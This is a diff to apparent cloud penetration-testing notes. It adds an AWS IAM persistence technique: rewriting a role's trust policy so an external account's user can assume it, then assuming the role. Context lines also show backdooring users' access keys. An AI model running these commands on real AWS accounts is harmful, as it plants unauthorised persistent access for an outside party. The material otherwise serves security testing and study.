@@ -25,6 +25,33 @@ aws iam create-access-key --user-name Sarah --profile Test
 run iam__backdoor_users_keys
 ```
 
+User with iam update-assume-role-policy
+Identify non-service-link role
+```
+aws iam a list-roles --profile Test
+```
+Change the trust-policy
+```
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "ec2.amazonaws.com",
+        "AWS": "arn:aws:iam::593820606366:user/vitquay-nonroot"
+      },
+      "Action": "sts:AssumeRole"
+    }
+  ]
+}
+```
+Update and assume role
+```
+aws iam update-assume-role-policy --role-name test-role --policy-document file://trust-policy.json --profile Test
+aws sts assume-role --role-arn arn:aws:iam::748384263101:role/test-role --role-session-name PersistenceTest --profile vitquaynonroot
+```
+
 ## EC2
 10.0.1.1 is reserved for the gateway of the subnet, 10.0.1.2 is
 reserved for AWS DNS, and 10.0.1.3 is reserved for any future use by
